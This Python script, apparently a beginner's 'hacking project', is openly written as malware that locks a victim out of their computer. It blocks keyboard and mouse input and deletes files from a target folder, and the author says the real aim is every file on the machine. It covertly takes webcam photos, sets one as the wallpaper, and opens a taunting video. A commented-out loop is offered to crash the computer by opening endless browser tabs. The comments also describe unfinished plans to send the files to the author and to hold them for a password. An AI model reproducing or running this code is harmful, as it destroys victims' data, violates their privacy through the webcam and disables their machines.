"""
This program is meant to hack someone by locking them out of their computer, the user will have a picture taken of
them on their webcam and replace that picture with a file they have installed on their computer. The idea was also to
be able to send those files to my computer but I wasn't able to complete that. I was aslo tring to figure
 out a way to have the users files be deleted until they type in a password but couldn't get that either.
 Hopefully with some more time I will be able to figure those parts out.
"""

import time
import Open_Camera
import Remove_File
import Block_User
import os
import webbrowser
import ctypes

Block_User.blockinput()

"""
I created the Folder HackMe so as not to delete all my files, but in reality this is meant to attack all the files 
in the computer. First count all the files for later to know how many pictures to take to replace  the files.
"""
count_file = 0
d = "C:\\Users\\elsda\\Desktop\\HackMe"
for path in os.listdir(d):
    if os.path.isfile(os.path.join(d, path)):
        count_file += 1


Remove_File.remove_file(count_file)

# Takes pictures based on how many files.

for i in range(count_file):
    Open_Camera.image_taker(i)
    # I added sleep here so that each picture would be different if not it would take the pictures too fast
    time.sleep(1)

time.sleep(5)

# Opens up a youtube video about getting hacked as a joke
webbrowser.open("https://www.youtube.com/watch?v=MBKRhmdbZVw?autoplay=1", new=1)

# Takes one of the pictures taken and sets it as the wallpaper.
SPI_SETDESKWALLPAPER = 20
ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "C:\\Users\\elsda\\PycharmProjects\\First Hacking Project\\You've_Been_Hacked_1.png" , 0)

time.sleep(5)

"""
This is something very simple that can crash the computer by overloading the CPU with lots of tabs being opened.
while True:
    webbrowser.open("https://www.youtube.com/watch?v=MBKRhmdbZVw?autoplay=1", new=1)
"""



Block_User.unblockinput()
